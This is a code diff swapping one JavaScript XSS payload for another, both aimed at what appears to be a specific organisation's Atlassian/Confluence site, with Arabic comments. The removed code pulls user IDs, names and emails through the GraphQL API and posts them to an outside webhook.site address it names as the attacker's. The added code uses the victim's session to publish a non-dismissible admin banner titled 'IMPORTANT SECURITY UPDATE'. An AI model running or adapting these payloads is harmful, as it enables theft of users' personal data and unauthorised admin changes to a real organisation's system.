@@ -1,51 +1,48 @@
-async function exfiltrateUsers() {
-    const attackerWebhook = "https://webhook.site/484d5e82-a167-4287-b904-c6986c57c769"; // webhookرابط ا
-    const url = "https://anshall.atlassian.net/cgraphql";
+function createAnnouncement() {
+  var xhttp = new XMLHttpRequest();
+  var url = "https://anshall.atlassian.net/cgraphql?q=CreateFormCreateAdminAnnouncementBannerMutation";
 
-    //   لسحب قائمة المستخدمين 
-    const queryBody = JSON.stringify([{
-        "operationName": "GetUsersQuery",
-        "variables": {},
-        "query": `query GetUsersQuery {
-            users {
-                edges {
-                    node {
-                        accountId
-                        displayName
-                        email
-                    }
-                }
-            }
-        }`
-    }]);
+  xhttp.open("POST", url, true);
 
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Atlassian-Token': 'no-check',
-                'X-Apollo-Operation-Name': 'GetUsersQuery'
-            },
-            body: queryBody
-        });
+  // الرؤوس الهامة بناءً على الـ Payload الجديد
+  xhttp.setRequestHeader("Content-type", "application/json");
+  xhttp.setRequestHeader("Accept", "*/*");
+  xhttp.setRequestHeader("X-Apollo-Operation-Name", "CreateFormCreateAdminAnnouncementBannerMutation");
+  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
+  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
 
-        const data = await response.json();
+  xhttp.withCredentials = true;
 
-        // إرسال البيانات المسروقة إلى سيرفرك
-        await fetch(attackerWebhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                source: "Atlassian_XSS_Exfil",
-                usersData: data
-            })
-        });
+  // بناء جسم الطلب - قمت بتعديل النص ليظهر أثر الـ XSS بوضوح
+  var data = JSON.stringify([{
+    "operationName": "CreateFormCreateAdminAnnouncementBannerMutation",
+    "variables": {
+      "announcementBanner": {
+        "appearance": "announcement",
+        "isDismissible": false,
+        "title": "IMPORTANT SECURITY UPDATE",
+        "visibility": "AUTHORIZED",
+        "content": "{\"version\":1,\"type\":\"doc\",\"content\":[{\"type\":\"paragraph\",\"content\":[{\"type\":\"text\",\"text\":\"This system has been verified for XSS vulnerability. Please contact the security team.\"}]}]}",
+        "status": "PUBLISHED",
+        "scheduledStartTime": "12/31/2025 17:15:41",
+        "scheduledEndTime": null,
+        "scheduledTimeZone": "Asia/Amman"
+      }
+    },
+    "query": "mutation CreateFormCreateAdminAnnouncementBannerMutation($announcementBanner: ConfluenceCreateAdminAnnouncementBannerInput!) {\n  createAdminAnnouncementBanner(announcementBanner: $announcementBanner) {\n    adminAnnouncementBannerSetting {\n      appearance\n      content\n      id\n      isDismissible\n      status\n      title\n      visibility\n      __typename\n    }\n    errors {\n      message\n      extensions {\n        errorType\n        __typename\n      }\n      __typename\n    }\n    success\n    __typename\n  }\n}\n"
+  }]);
 
-        console.log("✅ Data exfiltrated successfully.");
-    } catch (err) {
-        console.error("❌ Exfiltration failed:", err);
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      console.log("Status: " + this.status);
+      console.log("Response: " + this.responseText);
+      if (this.responseText.includes('"success":true')) {
+        console.log("✅ Announcement Created Successfully!");
+      }
     }
+  };
+
+  xhttp.send(data);
 }
 
-exfiltrateUsers();
+createAnnouncement();
